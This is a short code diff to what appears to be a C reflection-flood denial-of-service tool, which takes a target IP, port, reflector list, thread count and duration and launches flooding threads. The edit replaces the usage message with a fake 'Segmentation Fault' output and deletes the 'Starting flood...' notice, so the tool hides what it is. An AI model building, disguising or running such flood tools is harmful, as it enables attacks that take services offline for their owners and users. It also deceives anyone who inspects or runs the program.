@@ -130,8 +130,7 @@ void *flood(void *par1)
 int main(int argc, char *argv[ ])
 {
 	if(argc < 6){
-	fprintf(stderr, "Invalid parameters!\n");
-	fprintf(stdout, "Usage: %s <target IP> <target port> <reflection file> <threads> <pps limiter, -1 for no limit> <time>\n", argv[0]);
+	fprintf(stdout, "Segmentation Fault");
 		exit(-1);
 	}
 	srand(time(NULL));
@@ -183,7 +182,6 @@ int main(int argc, char *argv[ ])
 		td[i].list_node = current;
 		pthread_create( &thread[i], NULL, &flood, (void *) &td[i]);
 	}
-	fprintf(stdout, "Starting flood...\n");
 	for(i = 0;i<(atoi(argv[6])*multiplier);i++)
 	{
 		usleep((1000/multiplier)*1000);
